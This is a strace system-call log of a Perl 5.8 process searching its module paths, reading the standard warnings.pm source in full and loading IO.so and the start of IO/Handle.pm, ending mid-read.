13033 07:45:20.050554 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050567 stat64("/usr/lib/perl5/warnings.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050583 stat64("/usr/lib/perl5/warnings.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050596 stat64("/usr/share/perl5/warnings.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050607 stat64("/usr/share/perl5/warnings.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050761 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050773 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050802 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050815 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
13033 07:45:20.050835 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.050849 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.050861 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.050879 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
13033 07:45:20.051283 brk(0x81b6000)    = 0x81b6000
13033 07:45:20.051301 brk(0x81b5000)    = 0x81b5000
13033 07:45:20.051378 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
13033 07:45:20.051874 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
13033 07:45:20.052268 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
13033 07:45:20.052450 read(8, "", 4096) = 0
13033 07:45:20.052464 close(8)          = 0
13033 07:45:20.052612 _llseek(6, 412, [412], SEEK_SET) = 0
13033 07:45:20.052628 _llseek(6, 0, [412], SEEK_CUR) = 0
13033 07:45:20.052638 close(6)          = 0
13033 07:45:20.052678 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
13033 07:45:20.052701 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
13033 07:45:20.052728 futex(0xb7f17070, 0x81 /* FUTEX_??? */, 2147483647) = 0
13033 07:45:20.052744 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
13033 07:45:20.052757 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
13033 07:45:20.052874 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
13033 07:45:20.052914 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f1b000
13033 07:45:20.052927 mmap2(0xb7f1f000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f1f000
13033 07:45:20.052941 close(6)          = 0
13033 07:45:20.053066 stat64("/etc/perl/IO/Handle.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.053083 stat64("/etc/perl/IO/Handle.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053096 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.053109 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053122 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.053135 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053148 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.053160 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053173 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.053185 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053197 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.053210 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
13033 07:45:20.053230 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.053244 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.053259 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.053276 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ 